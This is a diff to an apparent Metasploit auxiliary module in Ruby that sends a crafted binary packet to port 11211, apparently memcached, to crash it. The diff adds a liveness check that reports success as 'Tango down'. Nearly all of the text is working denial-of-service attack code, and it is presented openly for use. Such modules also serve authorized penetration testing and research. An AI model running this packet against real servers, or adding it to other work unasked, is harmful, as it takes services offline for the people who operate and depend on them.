@@ -34,6 +34,17 @@ class Metasploit3 < Msf::Auxiliary
 		register_options([Opt::RPORT(11211),], self.class)
 	end
 
+	def is_alive?
+		begin
+			connect
+			disconnect
+		rescue Rex::ConnectionRefused
+			return false
+		end
+
+		return true
+	end
+
 	def run
 		connect
 		pkt =  "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00"
@@ -41,10 +52,17 @@ class Metasploit3 < Msf::Auxiliary
 		pkt << "\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 
-		print_status("Sending dos packet...")
-
+		print_status("#{rhost}:#{rport} - Sending dos packet...")
 		sock.put(pkt)
-
 		disconnect
+
+		print_status("#{rhost}:#{rport} - Checking host status...")
+		select(nil, nil, nil, 1)
+
+		if is_alive?
+			print_error("#{rhost}:#{rport} - The DoS attempt did not work, host is still alive")
+		else
+			print_good("#{rhost}:#{rport} - Tango down")  # WWJS - What would th3j35t3r say?
+		end
 	end
 end
